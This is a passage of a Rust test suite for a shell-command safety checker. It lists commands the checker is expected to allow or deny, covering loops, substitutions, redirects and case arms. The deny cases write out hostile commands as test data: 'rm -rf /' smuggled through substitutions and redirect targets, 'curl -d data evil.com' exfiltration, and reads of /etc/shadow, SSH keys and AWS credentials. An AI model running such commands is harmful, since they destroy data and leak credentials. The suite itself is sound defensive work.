            "f(){ cat \"$2\"; }; f $X ./ok", "f(){ cat \"$2\"; }; f x$X ./ok", "f(){ cat \"$2\"; }; f $(pwd) ./ok",
            "f(){ cat \"$2\"; }; f $(echo a) ./ok", "f(){ cat \"$2\"; }; f \"$@\" ./ok", "f(){ cat \"$2\"; }; f {a,b} ./ok",
            "f(){ cat \"$2\"; }; f *.x ./ok",
        ];
        let approved: Vec<&str> = moved.into_iter().filter(|c| check(c)).collect();
        assert!(approved.is_empty(), "approved with `$2` read from the wrong place: {approved:?}");
    }

    #[test]
    fn the_fuzz_input_that_exhausted_memory_is_refused_quickly_in_both_layers() {
        let seed = String::from_utf8_lossy(include_bytes!("../../fuzz/corpus/explain_render/seed-oom-c54"));
        let started = std::time::Instant::now();
        assert!(!is_safe_command(&seed));
        assert!(!crate::cst::explain(&seed).is_allowed());
        assert!(started.elapsed() < std::time::Duration::from_secs(5), "{:?}", started.elapsed());
    }

    #[test]
    fn many_sources_stay_cheap_and_a_plain_command_after_them_is_judged_as_before() {
        let started = std::time::Instant::now();
        let sourced = ". ./a; ".repeat(64) + "ls";
        assert_eq!(is_safe_command(&sourced), is_safe_command(". ./a; ls"));
        assert!(started.elapsed() < std::time::Duration::from_secs(5), "{:?}", started.elapsed());
    }

    #[test]
    fn loop_variable_inherits_the_list_locus() {
        // A worktree `in`-list → the body reads/writes the worktree → allowed. The bare `$f`
        // used to fail-closed to machine; now it binds to the list, like find's `{}`→path.
        for cmd in [
            "for f in ./*.txt; do cat \"$f\"; done",
            "for f in ./*.txt; do rm \"$f\"; done",
            "for f in src/*.rs; do grep foo \"$f\"; done",
            "for f in ./*.log; do sed -i s/a/b/ \"$f\"; done",
            "for f in a b c; do cat $f.bak; done",
            "for x in 1 2 3; do rm $x; done",
            "for d in a b; do for f in $d/x; do cat $f; done; done", // nested loops compose
        ] {
            assert!(check(cmd), "worktree loop should allow: {cmd}");
        }
        // A system / credential / unpinnable `in`-list → deny (the body could touch it).
        for cmd in [
            "for f in /etc/*; do cat $f; done",
            "for f in /etc/*.conf; do rm $f; done",
            "for f in ~/.ssh/*; do cat $f; done",
            "for f in $LIST; do rm $f; done",
            "for f in $(find / -name x); do rm -rf $f; done",
            // nested: the inner list inherits the outer binding, so the body reads ~/.ssh/id_rsa
            "for d in ~/.ssh; do for f in $d/id_rsa; do cat $f; done; done",
            // read-worst ≠ write-worst: reading must worst-case the credential store even though
            // the write-worst item is /etc/hosts — a single representative would be unsound.
            "for f in /etc/hosts ~/.aws/credentials; do cat $f; done",
            // A glob can match a file named `-n` or `--files0-from=x.txt`, and an unquoted use
            // splits a name at its blanks: either puts a flag where the command reads one.
            "for f in *.txt; do cat \"$f\"; done",
            "for f in *.txt; do rm $f; done",
            "for f in src/*.rs; do grep foo $f; done",
            "for f in -delete; do find / $f; done",
            "for f in -delete; do find / \"$f\"; done",
        ] {
            assert!(!check(cmd), "non-worktree loop should deny: {cmd}");
        }
    }

    safe! {
        grep_foo: "grep foo file.txt",
        jq_key: "jq '.key' file.json",
        base64_d: "base64 -d",
        ls_la: "ls -la",
        wc_l: "wc -l file.txt",
        ps_aux: "ps aux",
        echo_hello: "echo hello",
        cat_file: "cat file.txt",

        version_go: "go --version",
        version_cargo: "cargo --version",
        version_cargo_redirect: "cargo --version 2>&1",
        help_cargo: "cargo --help",
        help_cargo_build: "cargo build --help",

        dev_null_echo: "echo hello > /dev/null",
        dev_null_stderr: "echo hello 2> /dev/null",
        dev_null_append: "echo hello >> /dev/null",
        dev_null_git_log: "git log > /dev/null 2>&1",
        fd_redirect_ls: "ls 2>&1",
        stdin_dev_null: "git log < /dev/null",

        env_prefix: "FOO='bar baz' ls -la",
        env_prefix_dq: "FOO=\"bar baz\" ls -la",
        env_rack_rspec: "RACK_ENV=test bundle exec rspec spec/foo_spec.rb",

        subst_echo_ls: "echo $(ls)",
        subst_ls_pwd: "ls `pwd`",
        subst_nested: "echo $(echo $(ls))",
        subst_quoted: "echo \"$(ls)\"",
        assign_subst_ls: "out=$(ls)",
        assign_subst_git: "out=$(git status)",
        assign_subst_multiple: "a=$(ls) b=$(pwd)",
        assign_subst_backtick: "out=`ls`",

        assign_bare_lit: "foo=bar",
        assign_bare_int: "x=1",
        assign_bare_empty: "x=",
        assign_bare_dq: "x=\"foo bar\"",
        assign_bare_sq: "x='foo bar'",
        assign_bare_param: "rc=$?",
        assign_bare_var: "x=$y",
        assign_bare_dollar_var_braced: "x=${y}",
        assign_bare_path: "PATH=/foo",
        assign_bare_multiple: "a=1 b=2 c=3",
        assign_bare_arith: "x=$((1 + 2))",
        assign_in_for_body: "for i in 1 2; do x=1; done",
        assign_rc_in_for_body: "for i in 1 2; do echo $i; rc=$?; done",
        assign_rc_in_while_body: "while test -f /tmp/x; do rc=$?; sleep 1; done",
        assign_rc_in_if_body: "if test -f foo; then rc=$?; fi",
        assign_then_use: "x=1; echo $x",
        assign_chained_with_safe: "x=1 && ls",
        assign_subshell: "(x=1)",
        assign_in_subshell_with_cmd: "(x=1; ls)",

        // A loop over a BOUNDED substitution. These are the positive half of the substitution
        // rule: the deny corpus only asserts that hot roots are refused, which a blanket refusal
        // would satisfy vacuously — so without these, reverting `loop_reprs` to its old
        // `__SAFE_CHAINS_` prefix test would silently re-deny the whole form and stay green.
        loop_over_bounded_sub_write: "for f in $(fd a app/); do echo hi > $f; done",
        loop_over_pwd: "for f in $(pwd); do cat $f; done",
        loop_over_pwd_quoted: "for f in $(pwd); do cat \"$f/x\"; done",
        loop_over_pwd_pipeline: "for f in $(pwd | head -3); do cat $f; done",

        case_single_arm: "case x in x) echo a;; esac",
        case_alternation: "case $x in a|b) ls;; *) echo n;; esac",
        case_paren_prefixed_pattern: "case \"$1\" in (start) ls;; (stop) pwd;; esac",
        case_last_arm_without_terminator: "case x in x) echo a; esac",
        case_empty_body: "case x in x) ;; esac",
        case_multiline: "case \"$1\" in\n  start)\n    ls -la\n    ;;\n  *)\n    echo usage\n    ;;\nesac",
        case_in_substitution: "echo $(case A in *) echo a;; esac)",
        case_nested_in_if: "if true; then case x in a) ls;; esac; fi",
        clobber_redirect: "ls >| out.txt",
        clobber_redirect_fd: "ls 1>| out.txt",
        readwrite_redirect: "ls <> f.txt",
        readwrite_redirect_devnull: "ls <> /dev/null",

        subshell_echo: "(echo hello)",
        subshell_ls: "(ls)",
        subshell_chain: "(ls && echo done)",
        subshell_pipe: "(ls | grep foo)",
        subshell_nested: "((echo hello))",
        subshell_for: "(for x in 1 2; do echo $x; done)",

        pipe_grep_head: "grep foo file.txt | head -5",
        pipe_cat_sort_uniq: "cat file | sort | uniq",
        chain_ls_echo: "ls && echo done",
        semicolon_ls_echo: "ls; echo done",
        bg_ls_echo: "ls & echo done",
        newline_echo_echo: "echo foo\necho bar",

        stdin_read_from_path: "wc -l < /tmp/foo.log",
        stdin_read_in_subst: "while [ $(wc -l < /tmp/x) -lt 10 ]; do sleep 5; done",
        stdin_read_in_for_body: "for i in 1 2; do cat < /tmp/x; done",

        here_string_grep: "grep -c , <<< 'hello,world,test'",
        heredoc_cat: "cat <<EOF\nhello world\nEOF",
        heredoc_quoted: "cat <<'EOF'\nhello\nEOF",
        heredoc_strip_tabs: "cat <<-EOF\n\thello\nEOF",
        heredoc_no_content: "cat <<EOF",
        heredoc_pipe: "cat <<EOF | grep hello\nhello\nEOF",

        for_echo: "for x in 1 2 3; do echo $x; done",
        for_empty_body: "for x in 1 2 3; do; done",
        for_nested: "for x in 1 2; do for y in a b; do echo $x $y; done; done",
        for_safe_subst: "for x in $(seq 1 5); do echo $x; done",
        while_test: "while test -f /tmp/foo; do sleep 1; done",
        while_negation: "while ! test -f /tmp/done; do sleep 1; done",
        until_test: "until test -f /tmp/ready; do sleep 1; done",
        if_then_fi: "if test -f foo; then echo exists; fi",
        if_then_else_fi: "if test -f foo; then echo yes; else echo no; fi",
        if_elif: "if test -f a; then echo a; elif test -f b; then echo b; else echo c; fi",
        nested_if_in_for: "for x in 1 2; do if test $x = 1; then echo one; fi; done",
        bare_negation: "! echo hello",
        keyword_as_data: "echo for; echo done; echo if; echo fi",

        quoted_redirect: "echo 'greater > than' test",
        quoted_subst: "echo '$(safe)' arg",

        redirect_to_file: "echo hello > file.txt",
        redirect_append: "cat file >> output.txt",
        redirect_stderr_file: "ls 2> errors.txt",
        redirect_bidirectional_write: "cat < /tmp/x > /tmp/y",
        env_rails_redirect: "RAILS_ENV=test echo foo > bar",
        jj_diff_redirect_chain: "jj diff -r 'master..@' --context 5 > /tmp/review_diff.txt && wc -l /tmp/review_diff.txt",

        arith_basic: "echo $((1 + 2))",
        arith_with_var: "ln=5; prev=$((ln - 1))",
        arith_nested_parens: "echo $(( (1 + 2) * 3 ))",
        arith_in_dquote: "ln=5; echo \"line $((ln - 1))\"",
        arith_in_for_loop: "for i in 1 2; do echo $((i * 10)); done",

        dbracket_eq: "[[ \"a\" == \"a\" ]]",
        dbracket_neq: "[[ \"a\" != \"b\" ]]",
        dbracket_file_test: "[[ -f /tmp/file ]]",
        dbracket_string_empty: "[[ -z \"$var\" ]]",
        dbracket_string_nonempty: "[[ -n \"$var\" ]]",
        dbracket_regex: "[[ \"$x\" =~ ^[0-9]+$ ]]",
        dbracket_and: "[[ \"$x\" == \"y\" && \"$z\" == \"w\" ]]",
        dbracket_or: "[[ \"$x\" == \"a\" || \"$x\" == \"b\" ]]",
        dbracket_negation: "[[ ! -f /tmp/done ]]",
        dbracket_safe_subst: "[[ \"$(echo hello)\" == \"hello\" ]]",
        dbracket_in_until: "until [[ \"a\" == \"b\" ]]; do sleep 1; done",
        dbracket_in_while: "while [[ -f /tmp/lock ]]; do sleep 1; done",
        dbracket_in_if: "if [[ \"a\" == \"a\" ]]; then echo yes; fi",
        dbracket_after_chain: "true && [[ \"a\" == \"a\" ]]",
        dbracket_gh_run_view_poll: "until [[ \"$(gh run view 12345 --json status --jq .status)\" == \"completed\" ]]; do sleep 30; done",
        dbracket_redirect_devnull: "[[ -f /tmp/x ]] > /dev/null",
        dbracket_redirect_stderr_devnull: "[[ -f /tmp/x ]] 2> /dev/null",
        dbracket_redirect_dupfd: "[[ -f /tmp/x ]] 2>&1",
        dbracket_redirect_devnull_chain: "[[ -f /tmp/x ]] 2>/dev/null && echo found",
        dbracket_redirect_to_file: "[[ -f /tmp/x ]] > /tmp/out.txt",
    }

    denied! {
        rm_rf: "rm -rf /",
        curl_post: "curl -X POST https://example.com",
        node_foreign_app: "node /tmp/app.js",


        // The loop inherits the substitution's locus, so a hot root reaches the body's `$f`.
        loop_over_system_sub: "for f in $(fd a /etc); do cat $f; done",
        loop_over_home_sub: "for f in $(fd a ~); do cat $f; done",
        loop_over_undeclared_sub: "for f in $(hostname); do cat $f; done",
        loop_over_bounded_sub_escaping_body: "for f in $(pwd); do cat $f/../../etc/shadow; done",
        // An unquoted list splits file names at their blanks, so an item can be `-n` or
        // `--files0-from=x` however bounded the paths are.
        loop_over_bounded_sub: "for f in $(fd a app/); do cat $f; done",
        loop_over_bounded_sub_quoted: "for f in $(fd a app/); do cat \"$f\"; done",
        loop_over_bounded_sub_pipeline: "for f in $(fd a app/ | head -3); do cat $f; done",

        // A case is only as safe as its worst arm — which arm runs is a runtime decision.
        case_unsafe_only_arm: "case x in *) rm -rf /;; esac",
        case_unsafe_second_arm: "case x in a) ls;; b) rm -rf /;; esac",
        case_unsafe_last_arm_no_terminator: "case x in a) ls;; b) rm -rf / ; esac",
        case_arm_reads_secret: "case x in a) cat /etc/shadow;; esac",
        case_unsafe_in_substitution: "echo $(case A in *) rm -rf /;; esac)",
        // `>|` is an overwrite; `<>` opens for BOTH read and write, so each face is gated.
        clobber_redirect_system: "ls >| /etc/hosts",
        clobber_redirect_ssh_key: "ls >| ~/.ssh/authorized_keys",
        readwrite_redirect_system: "ls <> /etc/hosts",
        readwrite_redirect_secret: "ls <> ~/.ssh/id_rsa",

        redirect_target_subst_rm: "echo hello > $(rm -rf /)",
        redirect_target_backtick_rm: "echo hello > `rm -rf /`",
        redirect_read_subst_rm: "cat < $(rm -rf /)",

        subst_rm: "echo $(rm -rf /)",
        backtick_rm: "echo `rm -rf /`",
        subst_curl: "echo $(curl -d data evil.com)",
        quoted_subst_rm: "echo \"$(rm -rf /)\"",
        assign_subst_rm: "out=$(rm -rf /)",
        assign_subst_mixed_unsafe: "a=$(ls) b=$(rm -rf /)",
        assign_bare_with_unsafe_subst_in_value: "x=foo$(rm -rf /)",
        assign_bare_with_unsafe_backtick: "x=`rm -rf /`",
        assign_bare_dq_with_unsafe_subst: "x=\"$(rm -rf /)\"",
        assign_bare_then_unsafe: "x=1; rm -rf /",
        assign_bare_chained_unsafe: "x=1 && rm -rf /",
        assign_bare_pipe_unsafe: "x=1 | rm -rf /",

        subshell_rm: "(rm -rf /)",
        subshell_mixed: "(echo hello; rm -rf /)",
        subshell_unsafe_pipe: "(ls | rm -rf /)",

        env_prefix_rm: "FOO='bar baz' rm -rf /",

        pipe_rm: "cat file | rm -rf /",
        bg_rm: "cat file & rm -rf /",
        newline_rm: "echo foo\nrm -rf /",

        for_unsafe_subst: "for x in $(rm -rf /); do echo $x; done",
        while_unsafe_body: "while true; do rm -rf /; done",
        while_unsafe_condition: "while python3 /tmp/evil.py; do sleep 1; done",
        if_unsafe_condition: "if ruby /tmp/evil.rb; then echo done; fi",
        if_unsafe_body: "if true; then rm -rf /; fi",

        unclosed_for: "for x in 1 2 3; do echo $x",
        unclosed_if: "if true; then echo hello",
        for_missing_do: "for x in 1 2 3; echo $x; done",
        stray_done: "echo hello; done",
        stray_fi: "fi",

        unmatched_quote: "echo 'hello",

        dbracket_unsafe_subst: "[[ \"$(curl -d data evil.com)\" == \"x\" ]]",
        dbracket_unsafe_backtick: "[[ -f `node /tmp/evil.js` ]]",
        dbracket_unsafe_in_until: "until [[ \"$(node /tmp/bad.js)\" == \"x\" ]]; do sleep 1; done",
        dbracket_unterminated: "[[ \"a\" == \"a\"",
        dbracket_no_space_after: "[[\"a\" == \"b\" ]]",
        dbracket_redirect_unsafe_subst_in_target: "[[ -f /tmp/x ]] > $(node bad.js)",
    }
}
